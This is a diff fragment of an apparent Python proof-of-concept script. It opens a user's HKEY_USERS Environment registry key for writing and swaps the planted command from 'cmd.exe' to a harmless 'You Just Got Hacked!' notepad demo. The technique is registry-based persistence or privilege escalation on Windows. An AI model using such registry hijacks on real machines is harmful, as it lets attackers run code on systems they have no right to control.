@@ -4,13 +4,11 @@ import winreg
 # reg_path = "Environment"
 
 reg_hive = winreg.HKEY_USERS
-# userSID = "<userSID>"
-userSID = input(
-    "Enter User SID: "
-).strip()  # Decided to ask for input rather than hardcoding it
+# userSID = "<userSID>" 
+userSID = input("Enter User SID: ").strip() # Decided to ask for input rather than hardcoding it
 reg_path = f"{userSID}\Environment"
 
-command = "cmd.exe"
+command = "cmd /c echo You Just Got Hacked! > %temp%\hacked.txt && notepad %temp%\hacked.txt"
 
 try:
     key = winreg.OpenKey(reg_hive, reg_path, 0, access=winreg.KEY_WRITE)
